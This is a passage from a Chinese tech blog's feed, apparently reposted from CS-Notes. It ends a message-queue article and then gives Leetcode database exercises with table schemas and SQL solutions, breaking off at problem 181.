title="接收端的可靠性"></a>接收端的可靠性</h2><p>接收端能够从消息队列成功消费一次消息。</p><p>两种实现方法：</p><ul><li>保证接收端处理消息的业务逻辑具有幂等性：只要具有幂等性，那么消费多少次消息，最后处理的结果都是一样的。</li><li>保证消息具有唯一编号，并使用一张日志表来记录已经消费的消息编号。</li></ul><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="http://developers-club.com/posts/270339/" target="_blank" rel="noopener">Observer vs Pub-Sub</a></li><li><a href="https://blog.csdn.net/lizhitao/article/details/47723105" target="_blank" rel="noopener">消息队列中点对点与发布订阅区别</a></li></ul><p>本文转载自:<a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97.md">https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97.md</a></p>]]></content>
      
      
      <categories>
          
          <category> 系统设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 消息队列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Leetcode-Database 题解</title>
      <link href="/2018/12/24/shu-ju-ku/leetcode-database-ti-jie/"/>
      <url>/2018/12/24/shu-ju-ku/leetcode-database-ti-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="Leetcode-Database-题解"><a href="#Leetcode-Database-题解" class="headerlink" title="Leetcode-Database 题解"></a>Leetcode-Database 题解</h2><ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Leetcode-Database%20%E9%A2%98%E8%A7%A3.md#595-big-countries">595. Big Countries</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Leetcode-Database%20%E9%A2%98%E8%A7%A3.md#627-swap-salary">627. Swap Salary</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Leetcode-Database%20%E9%A2%98%E8%A7%A3.md#620-not-boring-movies">620. Not Boring Movies</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Leetcode-Database%20%E9%A2%98%E8%A7%A3.md#596-classes-more-than-5-students">596. Classes More Than 5 Students</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Leetcode-Database%20%E9%A2%98%E8%A7%A3.md#182-duplicate-emails">182. Duplicate Emails</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Leetcode-Database%20%E9%A2%98%E8%A7%A3.md#196-delete-duplicate-emails">196. Delete Duplicate Emails</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Leetcode-Database%20%E9%A2%98%E8%A7%A3.md#175-combine-two-tables">175. Combine Two Tables</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Leetcode-Database%20%E9%A2%98%E8%A7%A3.md#181-employees-earning-more-than-their-managers">181. Employees Earning More Than Their Managers</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Leetcode-Database%20%E9%A2%98%E8%A7%A3.md#183-customers-who-never-order">183. Customers Who Never Order</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Leetcode-Database%20%E9%A2%98%E8%A7%A3.md#184-department-highest-salary">184. Department Highest Salary</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Leetcode-Database%20%E9%A2%98%E8%A7%A3.md#176-second-highest-salary">176. Second Highest Salary</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Leetcode-Database%20%E9%A2%98%E8%A7%A3.md#177-nth-highest-salary">177. Nth Highest Salary</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Leetcode-Database%20%E9%A2%98%E8%A7%A3.md#178-rank-scores">178. Rank Scores</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Leetcode-Database%20%E9%A2%98%E8%A7%A3.md#180-consecutive-numbers">180. Consecutive Numbers</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Leetcode-Database%20%E9%A2%98%E8%A7%A3.md#626-exchange-seats">626. Exchange Seats</a></li></ul><h1 id="595-Big-Countries"><a href="#595-Big-Countries" class="headerlink" title="595. Big Countries"></a>595. Big Countries</h1><p><a href="https://leetcode.com/problems/big-countries/description/" target="_blank" rel="noopener">https://leetcode.com/problems/big-countries/description/</a></p><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><pre><code>+-----------------+------------+------------+--------------+---------------+| name            | continent  | area       | population   | gdp           |+-----------------+------------+------------+--------------+---------------+| Afghanistan     | Asia       | 652230     | 25500100     | 20343000      || Albania         | Europe     | 28748      | 2831741      | 12960000      || Algeria         | Africa     | 2381741    | 37100000     | 188681000     || Andorra         | Europe     | 468        | 78115        | 3712000       || Angola          | Africa     | 1246700    | 20609294     | 100990000     |+-----------------+------------+------------+--------------+---------------+</code></pre><p>查找面积超过 3,000,000 或者人口数超过 25,000,000 的国家。</p><pre><code>+--------------+-------------+--------------+| name         | population  | area         |+--------------+-------------+--------------+| Afghanistan  | 25500100    | 652230       || Algeria      | 37100000    | 2381741      |+--------------+-------------+--------------+</code></pre><h2 id="SQL-Schema"><a href="#SQL-Schema" class="headerlink" title="SQL Schema"></a>SQL Schema</h2><pre class=" language-sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span><span class="token keyword">IF</span>    <span class="token keyword">EXISTS</span> World<span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> World <span class="token punctuation">(</span> NAME <span class="token keyword">VARCHAR</span> <span class="token punctuation">(</span> <span class="token number">255</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> continent <span class="token keyword">VARCHAR</span> <span class="token punctuation">(</span> <span class="token number">255</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> area <span class="token keyword">INT</span><span class="token punctuation">,</span> population <span class="token keyword">INT</span><span class="token punctuation">,</span> gdp <span class="token keyword">INT</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> World <span class="token punctuation">(</span> NAME<span class="token punctuation">,</span> continent<span class="token punctuation">,</span> area<span class="token punctuation">,</span> population<span class="token punctuation">,</span> gdp <span class="token punctuation">)</span><span class="token keyword">VALUES</span>    <span class="token punctuation">(</span> <span class="token string">'Afghanistan'</span><span class="token punctuation">,</span> <span class="token string">'Asia'</span><span class="token punctuation">,</span> <span class="token string">'652230'</span><span class="token punctuation">,</span> <span class="token string">'25500100'</span><span class="token punctuation">,</span> <span class="token string">'203430000'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token string">'Albania'</span><span class="token punctuation">,</span> <span class="token string">'Europe'</span><span class="token punctuation">,</span> <span class="token string">'28748'</span><span class="token punctuation">,</span> <span class="token string">'2831741'</span><span class="token punctuation">,</span> <span class="token string">'129600000'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token string">'Algeria'</span><span class="token punctuation">,</span> <span class="token string">'Africa'</span><span class="token punctuation">,</span> <span class="token string">'2381741'</span><span class="token punctuation">,</span> <span class="token string">'37100000'</span><span class="token punctuation">,</span> <span class="token string">'1886810000'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token string">'Andorra'</span><span class="token punctuation">,</span> <span class="token string">'Europe'</span><span class="token punctuation">,</span> <span class="token string">'468'</span><span class="token punctuation">,</span> <span class="token string">'78115'</span><span class="token punctuation">,</span> <span class="token string">'37120000'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token string">'Angola'</span><span class="token punctuation">,</span> <span class="token string">'Africa'</span><span class="token punctuation">,</span> <span class="token string">'1246700'</span><span class="token punctuation">,</span> <span class="token string">'20609294'</span><span class="token punctuation">,</span> <span class="token string">'1009900000'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> name<span class="token punctuation">,</span>    population<span class="token punctuation">,</span>    area<span class="token keyword">FROM</span>    World<span class="token keyword">WHERE</span>    area <span class="token operator">></span> <span class="token number">3000000</span>    <span class="token operator">OR</span> population <span class="token operator">></span> <span class="token number">25000000</span><span class="token punctuation">;</span></code></pre><h1 id="627-Swap-Salary"><a href="#627-Swap-Salary" class="headerlink" title="627. Swap Salary"></a>627. Swap Salary</h1><p><a href="https://leetcode.com/problems/swap-salary/description/" target="_blank" rel="noopener">https://leetcode.com/problems/swap-salary/description/</a></p><h2 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h2><pre><code>| id | name | sex | salary ||----|------|-----|--------|| 1  | A    | m   | 2500   || 2  | B    | f   | 1500   || 3  | C    | m   | 5500   || 4  | D    | f   | 500    |</code></pre><p>只用一个 SQL 查询，将 sex 字段反转。</p><pre><code>| id | name | sex | salary ||----|------|-----|--------|| 1  | A    | f   | 2500   || 2  | B    | m   | 1500   || 3  | C    | f   | 5500   || 4  | D    | m   | 500    |</code></pre><h2 id="SQL-Schema-1"><a href="#SQL-Schema-1" class="headerlink" title="SQL Schema"></a>SQL Schema</h2><pre class=" language-sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span><span class="token keyword">IF</span>    <span class="token keyword">EXISTS</span> salary<span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> salary <span class="token punctuation">(</span> id <span class="token keyword">INT</span><span class="token punctuation">,</span> NAME <span class="token keyword">VARCHAR</span> <span class="token punctuation">(</span> <span class="token number">100</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> sex CHAR <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> salary <span class="token keyword">INT</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> salary <span class="token punctuation">(</span> id<span class="token punctuation">,</span> NAME<span class="token punctuation">,</span> sex<span class="token punctuation">,</span> salary <span class="token punctuation">)</span><span class="token keyword">VALUES</span>    <span class="token punctuation">(</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'2500'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'f'</span><span class="token punctuation">,</span> <span class="token string">'1500'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'5500'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">,</span> <span class="token string">'f'</span><span class="token punctuation">,</span> <span class="token string">'500'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><pre class=" language-sql"><code class="language-sql"><span class="token keyword">UPDATE</span> salary<span class="token keyword">SET</span> sex <span class="token operator">=</span> CHAR <span class="token punctuation">(</span> ASCII<span class="token punctuation">(</span>sex<span class="token punctuation">)</span> <span class="token operator">^</span> ASCII<span class="token punctuation">(</span> <span class="token string">'m'</span> <span class="token punctuation">)</span> <span class="token operator">^</span> ASCII<span class="token punctuation">(</span> <span class="token string">'f'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h1 id="620-Not-Boring-Movies"><a href="#620-Not-Boring-Movies" class="headerlink" title="620. Not Boring Movies"></a>620. Not Boring Movies</h1><p><a href="https://leetcode.com/problems/not-boring-movies/description/" target="_blank" rel="noopener">https://leetcode.com/problems/not-boring-movies/description/</a></p><h2 id="Description-2"><a href="#Description-2" class="headerlink" title="Description"></a>Description</h2><pre><code>+---------+-----------+--------------+-----------+|   id    | movie     |  description |  rating   |+---------+-----------+--------------+-----------+|   1     | War       |   great 3D   |   8.9     ||   2     | Science   |   fiction    |   8.5     ||   3     | irish     |   boring     |   6.2     ||   4     | Ice song  |   Fantacy    |   8.6     ||   5     | House card|   Interesting|   9.1     |+---------+-----------+--------------+-----------+</code></pre><p>查找 id 为奇数，并且 description 不是 boring 的电影，按 rating 降序。</p><pre><code>+---------+-----------+--------------+-----------+|   id    | movie     |  description |  rating   |+---------+-----------+--------------+-----------+|   5     | House card|   Interesting|   9.1     ||   1     | War       |   great 3D   |   8.9     |+---------+-----------+--------------+-----------+</code></pre><h2 id="SQL-Schema-2"><a href="#SQL-Schema-2" class="headerlink" title="SQL Schema"></a>SQL Schema</h2><pre class=" language-sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span><span class="token keyword">IF</span>    <span class="token keyword">EXISTS</span> cinema<span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> cinema <span class="token punctuation">(</span> id <span class="token keyword">INT</span><span class="token punctuation">,</span> movie <span class="token keyword">VARCHAR</span> <span class="token punctuation">(</span> <span class="token number">255</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> description <span class="token keyword">VARCHAR</span> <span class="token punctuation">(</span> <span class="token number">255</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> rating <span class="token keyword">FLOAT</span> <span class="token punctuation">(</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> cinema <span class="token punctuation">(</span> id<span class="token punctuation">,</span> movie<span class="token punctuation">,</span> description<span class="token punctuation">,</span> rating <span class="token punctuation">)</span><span class="token keyword">VALUES</span>    <span class="token punctuation">(</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'War'</span><span class="token punctuation">,</span> <span class="token string">'great 3D'</span><span class="token punctuation">,</span> <span class="token number">8.9</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'Science'</span><span class="token punctuation">,</span> <span class="token string">'fiction'</span><span class="token punctuation">,</span> <span class="token number">8.5</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'irish'</span><span class="token punctuation">,</span> <span class="token string">'boring'</span><span class="token punctuation">,</span> <span class="token number">6.2</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'Ice song'</span><span class="token punctuation">,</span> <span class="token string">'Fantacy'</span><span class="token punctuation">,</span> <span class="token number">8.6</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'House card'</span><span class="token punctuation">,</span> <span class="token string">'Interesting'</span><span class="token punctuation">,</span> <span class="token number">9.1</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h2><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span>    <span class="token operator">*</span><span class="token keyword">FROM</span>    cinema<span class="token keyword">WHERE</span>    id <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">=</span> <span class="token number">1</span>    <span class="token operator">AND</span> description <span class="token operator">!=</span> <span class="token string">'boring'</span><span class="token keyword">ORDER</span> <span class="token keyword">BY</span>    rating <span class="token keyword">DESC</span><span class="token punctuation">;</span></code></pre><h1 id="596-Classes-More-Than-5-Students"><a href="#596-Classes-More-Than-5-Students" class="headerlink" title="596. Classes More Than 5 Students"></a>596. Classes More Than 5 Students</h1><p><a href="https://leetcode.com/problems/classes-more-than-5-students/description/" target="_blank" rel="noopener">https://leetcode.com/problems/classes-more-than-5-students/description/</a></p><h2 id="Description-3"><a href="#Description-3" class="headerlink" title="Description"></a>Description</h2><pre><code>+---------+------------+| student | class      |+---------+------------+| A       | Math       || B       | English    || C       | Math       || D       | Biology    || E       | Math       || F       | Computer   || G       | Math       || H       | Math       || I       | Math       |+---------+------------+</code></pre><p>查找有五名及以上 student 的 class。</p><pre><code>+---------+| class   |+---------+| Math    |+---------+</code></pre><h2 id="SQL-Schema-3"><a href="#SQL-Schema-3" class="headerlink" title="SQL Schema"></a>SQL Schema</h2><pre class=" language-sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span><span class="token keyword">IF</span>    <span class="token keyword">EXISTS</span> courses<span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> courses <span class="token punctuation">(</span> student <span class="token keyword">VARCHAR</span> <span class="token punctuation">(</span> <span class="token number">255</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> class <span class="token keyword">VARCHAR</span> <span class="token punctuation">(</span> <span class="token number">255</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> courses <span class="token punctuation">(</span> student<span class="token punctuation">,</span> class <span class="token punctuation">)</span><span class="token keyword">VALUES</span>    <span class="token punctuation">(</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'Math'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'English'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'Math'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token string">'D'</span><span class="token punctuation">,</span> <span class="token string">'Biology'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'Math'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token string">'F'</span><span class="token punctuation">,</span> <span class="token string">'Computer'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token string">'G'</span><span class="token punctuation">,</span> <span class="token string">'Math'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token string">'H'</span><span class="token punctuation">,</span> <span class="token string">'Math'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token string">'Math'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h2><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span>    class<span class="token keyword">FROM</span>    courses<span class="token keyword">GROUP</span> <span class="token keyword">BY</span>    class<span class="token keyword">HAVING</span>    <span class="token function">count</span><span class="token punctuation">(</span> <span class="token keyword">DISTINCT</span> student <span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">5</span><span class="token punctuation">;</span></code></pre><h1 id="182-Duplicate-Emails"><a href="#182-Duplicate-Emails" class="headerlink" title="182. Duplicate Emails"></a>182. Duplicate Emails</h1><p><a href="https://leetcode.com/problems/duplicate-emails/description/" target="_blank" rel="noopener">https://leetcode.com/problems/duplicate-emails/description/</a></p><h2 id="Description-4"><a href="#Description-4" class="headerlink" title="Description"></a>Description</h2><p>邮件地址表：</p><pre><code>+----+---------+| Id | Email   |+----+---------+| 1  | a@b.com || 2  | c@d.com || 3  | a@b.com |+----+---------+</code></pre><p>查找重复的邮件地址：</p><pre><code>+---------+| Email   |+---------+| a@b.com |+---------+</code></pre><h2 id="SQL-Schema-4"><a href="#SQL-Schema-4" class="headerlink" title="SQL Schema"></a>SQL Schema</h2><pre class=" language-sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span><span class="token keyword">IF</span>    <span class="token keyword">EXISTS</span> Person<span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> Person <span class="token punctuation">(</span> Id <span class="token keyword">INT</span><span class="token punctuation">,</span> Email <span class="token keyword">VARCHAR</span> <span class="token punctuation">(</span> <span class="token number">255</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> Person <span class="token punctuation">(</span> Id<span class="token punctuation">,</span> Email <span class="token punctuation">)</span><span class="token keyword">VALUES</span>    <span class="token punctuation">(</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'a@b.com'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'c@d.com'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'a@b.com'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h2><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span>    Email<span class="token keyword">FROM</span>    Person<span class="token keyword">GROUP</span> <span class="token keyword">BY</span>    Email<span class="token keyword">HAVING</span>    <span class="token function">COUNT</span><span class="token punctuation">(</span> <span class="token operator">*</span> <span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">;</span></code></pre><h1 id="196-Delete-Duplicate-Emails"><a href="#196-Delete-Duplicate-Emails" class="headerlink" title="196. Delete Duplicate Emails"></a>196. Delete Duplicate Emails</h1><p><a href="https://leetcode.com/problems/delete-duplicate-emails/description/" target="_blank" rel="noopener">https://leetcode.com/problems/delete-duplicate-emails/description/</a></p><h2 id="Description-5"><a href="#Description-5" class="headerlink" title="Description"></a>Description</h2><p>邮件地址表：</p><pre><code>+----+---------+| Id | Email   |+----+---------+| 1  | a@b.com || 2  | c@d.com || 3  | a@b.com |+----+---------+</code></pre><p>删除重复的邮件地址：</p><pre><code>+----+------------------+| Id | Email            |+----+------------------+| 1  | john@example.com || 2  | bob@example.com  |+----+------------------+</code></pre><h2 id="SQL-Schema-5"><a href="#SQL-Schema-5" class="headerlink" title="SQL Schema"></a>SQL Schema</h2><p>与 182 相同。</p><h2 id="Solution-5"><a href="#Solution-5" class="headerlink" title="Solution"></a>Solution</h2><p>连接：</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">DELETE</span> p1<span class="token keyword">FROM</span>    Person p1<span class="token punctuation">,</span>    Person p2<span class="token keyword">WHERE</span>    p1<span class="token punctuation">.</span>Email <span class="token operator">=</span> p2<span class="token punctuation">.</span>Email    <span class="token operator">AND</span> p1<span class="token punctuation">.</span>Id <span class="token operator">></span> p2<span class="token punctuation">.</span>Id</code></pre><p>子查询：</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">DELETE</span><span class="token keyword">FROM</span>    Person<span class="token keyword">WHERE</span>    id <span class="token operator">NOT</span> <span class="token operator">IN</span> <span class="token punctuation">(</span> <span class="token keyword">SELECT</span> id <span class="token keyword">FROM</span> <span class="token punctuation">(</span> <span class="token keyword">SELECT</span> <span class="token function">min</span><span class="token punctuation">(</span> id <span class="token punctuation">)</span> <span class="token keyword">AS</span> id <span class="token keyword">FROM</span> Person <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> email <span class="token punctuation">)</span> <span class="token keyword">AS</span> m <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>应该注意的是上述解法额外嵌套了一个 SELECT 语句，如果不这么做，会出现错误：You can’t specify target table ‘Person’ for update in FROM clause。以下演示了这种错误解法。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">DELETE</span><span class="token keyword">FROM</span>    Person<span class="token keyword">WHERE</span>    id <span class="token operator">NOT</span> <span class="token operator">IN</span> <span class="token punctuation">(</span> <span class="token keyword">SELECT</span> <span class="token function">min</span><span class="token punctuation">(</span> id <span class="token punctuation">)</span> <span class="token keyword">AS</span> id <span class="token keyword">FROM</span> Person <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> email <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>参考：<a href="https://stackoverflow.com/questions/45494/mysql-error-1093-cant-specify-target-table-for-update-in-from-clause" target="_blank" rel="noopener">pMySQL Error 1093 - Can’t specify target table for update in FROM clause</a></p><h1 id="175-Combine-Two-Tables"><a href="#175-Combine-Two-Tables" class="headerlink" title="175. Combine Two Tables"></a>175. Combine Two Tables</h1><p><a href="https://leetcode.com/problems/combine-two-tables/description/" target="_blank" rel="noopener">https://leetcode.com/problems/combine-two-tables/description/</a></p><h2 id="Description-6"><a href="#Description-6" class="headerlink" title="Description"></a>Description</h2><p>Person 表：</p><pre><code>+-------------+---------+| Column Name | Type    |+-------------+---------+| PersonId    | int     || FirstName   | varchar || LastName    | varchar |+-------------+---------+PersonId is the primary key column for this table.</code></pre><p>Address 表：</p><pre><code>+-------------+---------+| Column Name | Type    |+-------------+---------+| AddressId   | int     || PersonId    | int     || City        | varchar || State       | varchar |+-------------+---------+AddressId is the primary key column for this table.</code></pre><p>查找 FirstName, LastName, City, State 数据，而不管一个用户有没有填地址信息。</p><h2 id="SQL-Schema-6"><a href="#SQL-Schema-6" class="headerlink" title="SQL Schema"></a>SQL Schema</h2><pre class=" language-sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span><span class="token keyword">IF</span>    <span class="token keyword">EXISTS</span> Person<span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> Person <span class="token punctuation">(</span> PersonId <span class="token keyword">INT</span><span class="token punctuation">,</span> FirstName <span class="token keyword">VARCHAR</span> <span class="token punctuation">(</span> <span class="token number">255</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> LastName <span class="token keyword">VARCHAR</span> <span class="token punctuation">(</span> <span class="token number">255</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span><span class="token keyword">IF</span>    <span class="token keyword">EXISTS</span> Address<span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> Address <span class="token punctuation">(</span> AddressId <span class="token keyword">INT</span><span class="token punctuation">,</span> PersonId <span class="token keyword">INT</span><span class="token punctuation">,</span> City <span class="token keyword">VARCHAR</span> <span class="token punctuation">(</span> <span class="token number">255</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> State <span class="token keyword">VARCHAR</span> <span class="token punctuation">(</span> <span class="token number">255</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> Person <span class="token punctuation">(</span> PersonId<span class="token punctuation">,</span> LastName<span class="token punctuation">,</span> FirstName <span class="token punctuation">)</span><span class="token keyword">VALUES</span>    <span class="token punctuation">(</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'Wang'</span><span class="token punctuation">,</span> <span class="token string">'Allen'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> Address <span class="token punctuation">(</span> AddressId<span class="token punctuation">,</span> PersonId<span class="token punctuation">,</span> City<span class="token punctuation">,</span> State <span class="token punctuation">)</span><span class="token keyword">VALUES</span>    <span class="token punctuation">(</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'New York City'</span><span class="token punctuation">,</span> <span class="token string">'New York'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="Solution-6"><a href="#Solution-6" class="headerlink" title="Solution"></a>Solution</h2><p>使用左外连接。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span>    FirstName<span class="token punctuation">,</span>    LastName<span class="token punctuation">,</span>    City<span class="token punctuation">,</span>    State<span class="token keyword">FROM</span>    Person P    <span class="token keyword">LEFT</span> <span class="token keyword">JOIN</span> Address A    <span class="token keyword">ON</span> P<span class="token punctuation">.</span>PersonId <span class="token operator">=</span> A<span class="token punctuation">.</span>PersonId<span class="token punctuation">;</span></code></pre><h1 id="181-Employees-Earning-More-Than-Their-Managers"><a href="#181-Employees-Earning-More-Than-Their-Managers" class="headerlink" title="181. Employees Earning More Than Their Managers"></a>181. Employees Earning More Than Their Managers</h1><p><a href="https://leetcode.com/problems/employees-earning-more-than-their-managers/description/" target="_blank" rel="noopener">https://leetcode.com/problems/employees-earning-more-than-their-managers/description/</a></p><h2 id="Description-7"><a href="#Description-7" class="headerlink" title="Description"></a>Description</h2><p>Employee 表：</p><pre><code>+----+-------+--------+-----------+| Id | Name  | Salary | ManagerId |+----+-------+--------+-----------+| 1  | Joe   | 70000  | 3         || 2  | Henry | 80000  | 4         || 3  | Sam   | 60000  | NULL      || 4  | Max   | 90000  | NULL      |+----+-------+--------+-----------+</code></pre><p>查找薪资大于其经理薪资的员工信息。</p><h2 